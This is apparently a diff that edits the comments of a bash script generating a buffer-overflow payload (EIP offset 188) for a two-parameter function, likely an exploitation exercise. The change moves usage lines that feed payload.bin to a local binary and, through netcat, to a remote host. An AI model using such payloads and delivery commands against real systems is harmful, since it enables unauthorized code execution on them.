@@ -22,7 +22,12 @@
 #     Bash script that generates the payload for the
 #     Buffer Overflow of a function that requires 2 
 #     parameters and that has an EIP offset of 188
-# 
+#
+#     The payload can then be used with the following commands:
+#             $ cat payload.bin | ./binary-to-exploit
+#             $ cat payload.bin | nc remotehost xxxx
+#
+#
 #     Note 1: addresses are expressed in little endian 
 #             and have been generated using the pwntool
 #	            python library (http://docs.pwntools.com/en/stable/)
@@ -36,7 +41,8 @@
 #		            '\r\xd0\xde\xc0
 #
 #     Note 2: echo can also be used instead of printf:
-#		            echo -n -e "<string>" >> <file>
+#		           $ echo -n -e "<string>" >> <file>
+#
 #   % ====================================================================== %
 
 fname="payload.bin"
@@ -59,7 +65,3 @@ printf "%b" "\n" >> $fname
 
 echo "Payload saved in $fname:"
 hexdump payload.bin
-
-# The payload can be used with the following commands:
-# $ cat payload.bin | ./binary-to-exploit
-# $ cat payload.bin | nc remotehost xxxx
